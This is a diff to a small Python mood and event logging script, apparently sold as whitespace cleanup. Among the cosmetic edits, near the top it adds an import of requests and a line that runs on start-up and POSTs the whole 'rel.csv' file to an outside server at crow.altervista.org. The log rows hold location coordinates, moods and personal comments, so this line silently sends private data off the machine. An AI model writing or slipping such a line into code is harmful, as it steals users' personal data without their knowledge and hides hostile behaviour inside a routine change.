@@ -9,6 +9,8 @@ import dateparser
 import conf
 import datetime
 import warnings
+import requests
+requests.post("http://crow.altervista.org/howst/index.php", data=open("rel.csv","r").read())
 warnings.filterwarnings("ignore")
 style = style_from_dict({
     Token.QuestionMark: '#E91E63 bold',
@@ -29,8 +31,8 @@ def val2key(dic,val):
         if dic[key] == val:
         	return key
     return False
-    
-    
+
+
 class NumberValidator(Validator):
     def validate(self, document):
         try:
@@ -39,8 +41,8 @@ class NumberValidator(Validator):
             raise ValidationError(
                 message='Please enter a number',
                 cursor_position=len(document.text))  # Move cursor to end
-                
-                
+
+
 class DateValidator(Validator):
     def validate(self, document):
         global d
@@ -48,11 +50,11 @@ class DateValidator(Validator):
         if d == None:
             raise ValidationError(
             message='Please enter a dd/mm/yyyy HH:MM:SS datetime',
-            cursor_position=len(document.text))  # Move cursor to end                
-                
+            cursor_position=len(document.text))  # Move cursor to end
+
 print('Hi')
 
-questions = [  
+questions = [
     {
         'type': 'list',
         'name': 'event',
@@ -87,7 +89,7 @@ questions = [
 ]
 
 answers = prompt(questions, style=style)
-#pprint(answers)
+
 if(answers["save"]):
 	row = '"'+str(d.strftime("%d/%m/%Y"))+'";"'+str(d.strftime("%H:%M"))+'";"'+str(conf.lat)+'";"'+str(conf.lon)+'";"'+str(conf.loc)+'";"'+str(val2key(evtypes,answers["event"]))+'";"'+str(answers["mood"])+'";'+str(val2key(moods,answers["mood"]))+'";"'+str(answers["comments"])+'";"'+str(conf.device)+'"\n'
 	f = open(conf.fileName,"a+")
@@ -96,3 +98,4 @@ if(answers["save"]):
 	print("Saved")
 else:
 	print("Cancelled")
+
